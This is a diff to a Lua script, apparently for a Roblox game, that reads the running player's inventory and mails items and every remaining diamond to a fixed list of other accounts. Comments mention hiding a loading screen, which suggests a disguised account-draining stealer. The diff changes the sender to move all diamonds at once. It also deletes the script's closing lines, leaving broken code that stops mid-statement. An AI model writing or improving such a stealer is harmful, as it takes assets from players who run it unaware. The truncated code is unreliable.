@@ -123,7 +123,7 @@ local function sendItem(category, uid)
     end
 end
 
--- FIXED: Send all remaining gems after items, cycling users
+-- FIXED: Send all remaining diamonds after items in one mail per user
 local function SendAllGems()
     local gemIndex = nil
     for i, v in pairs(GetSave().Inventory.Currency) do
@@ -133,28 +133,25 @@ local function SendAllGems()
         end
     end
 
-    if not gemIndex then return end
+    if not gemIndex or GemAmount1 <= 0 then return end
 
     local remainingGems = GemAmount1
     local userIndex = 1
     local maxUsers = #users
 
-    while remainingGems > 0 do
-        if userIndex > maxUsers then
-            warn("All mailboxes full for gems")
-            break
-        end
+    while remainingGems > 0 and userIndex <= maxUsers do
         local currentUser = users[userIndex]
-        local args = {[1]=currentUser, [2]=MailMessage, [3]="Currency", [4]=gemIndex, [5]=1} -- send 1 gem at a time
+        local args = {[1]=currentUser, [2]=MailMessage, [3]="Currency", [4]=gemIndex, [5]=remainingGems} -- send all remaining diamonds
         local response, err = network.Invoke("Mailbox: Send", unpack(args))
 
         if response == true then
-            remainingGems = remainingGems - 1
-            GemAmount1 = GemAmount1 - 1
+            GemAmount1 = 0
+            remainingGems = 0
         elseif err == "They don't have enough space!" then
             userIndex = userIndex + 1
         else
             warn("Failed to send gems: "..tostring(err))
+            break
         end
     end
 end
@@ -244,16 +241,4 @@ if #sortedItems>0 or GemAmount1>min_rap+mailSendPrice then
             if success then
                 remaining = remaining - 1
             else
-                userIndex = userIndex + 1
-            end
-        end
-    end
-
-    -- Send leftover gems after all items
-    if GemAmount1 > 0 then
-        SendAllGems()
-    end
-
-    -- Hide loading GUI
-    message.Close()
-end
+                userIndex = userIndex
